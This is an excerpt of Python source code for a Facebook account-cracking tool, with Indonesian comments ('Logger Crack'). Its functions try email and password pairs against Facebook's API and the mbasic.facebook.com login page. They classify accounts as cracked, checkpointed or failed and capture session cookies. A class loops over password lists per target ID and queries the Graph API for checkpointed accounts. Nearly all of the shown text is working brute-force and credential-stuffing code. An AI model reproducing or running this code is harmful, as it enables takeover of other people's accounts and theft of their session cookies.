...
### Penampungan
_id_tampung_ = []
_ua_dev_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
...
### Logger Crack
def _log_api_dev_(_email_dev_,_pass_dev_):
    ...
    response = _req_ses_.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":_email_dev_,"pass":_pass_dev_}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":_email_dev_,"pass":_pass_dev_}
    else:
        return {"status":"error","email":_email_dev_,"pass":_pass_dev_}
def _log_mbasic_dev_(_email_dev_,_pass_dev_):
    _req_ses_.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_ua_dev_,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = _req_ses_.get("https://mbasic.facebook.com/")
    b = _req_ses_.post("https://mbasic.facebook.com/login.php", data={"email": _email_dev_, "pass": _pass_dev_, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in _req_ses_.cookies.get_dict().items() ])
    if "c_user" in _req_ses_.cookies.get_dict().keys():
        return {"status":"success","email":_email_dev_,"pass":_pass_dev_,"cookies":_raw_cookies_}
    elif "checkpoint" in _req_ses_.cookies.get_dict().keys():
        return {"status":"cp","email":_email_dev_,"pass":_pass_dev_,"cookies":_raw_cookies_}
    else:
        return {"status":"error","email":_email_dev_,"pass":_pass_dev_}
def koki(_cookies_):
...
class _crack_dev_:
    ...
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = _log_mbasic_dev_(fl.get("id"),i)
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + _dapunta_dapunta_("token.txt","r").read())
                        tt = json.loads(ke.text)
